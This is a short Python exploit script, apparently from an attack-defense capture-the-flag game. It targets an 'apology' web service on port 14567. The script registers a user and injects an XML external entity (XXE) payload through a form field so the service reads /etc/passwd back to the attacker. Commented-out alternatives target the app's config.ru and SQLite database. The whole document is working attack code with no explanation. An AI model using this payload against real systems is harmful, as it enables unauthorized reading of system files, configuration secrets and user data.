from random import choice, randint
from string import  ascii_letters
from base64 import b64encode
import requests as rq
import sys 

host = sys.argv[0]

def gen_random_string(N=5):
	return "".join(choice(ascii_letters) for i in range(N))

def create_headers(username, password):
	auth_string = b64encode("{}:{}".format(username, password).encode()).decode()
	headers = {"Authorization":"Basic {}".format(auth_string)}
	return headers

username = "FARGATETOP{}".format(randint(10000, 99999))
file_path = "/etc/passwd"
# file_path = "/usr/src/app/config.ru"
# file_path = "/usr/src/app/db.sqlite"
id_apology = gen_random_string()
payload = """{}
[<!ELEMENT foo ANY><!ENTITY xxe SYSTEM 'file:///{}'>]><root><apologies direction="in"><apology id='{}' private='true' nickname='A_VOT_NE_SKAZU'><apology_text>&xxe;</apology_text></apology></apologies></root><!--""".format(username,file_path, id_apology)

password = "zzz"
print(username, password)

try:
	host = sys.argv[1]
except:
	host = "127.0.0.1"
	# host = "6.6.1.2"
url = "http://{}:14567".format(host)

res = rq.post(url.format(host)+"/register", data={"username":username, "password":password})
headers = create_headers(username, password)
data = {"nickname_receiver":payload,
		"private":"true",
		"apology_text":"ZZZZZZZZZZ"}
res = rq.post(url+"/apology", headers=headers, data=data)
# print(res.text)

res = rq.get(url.format(host)+"/apology/read?nickname_sender={}&id={}".format(username, id_apology), headers=headers)
# print(res.text)
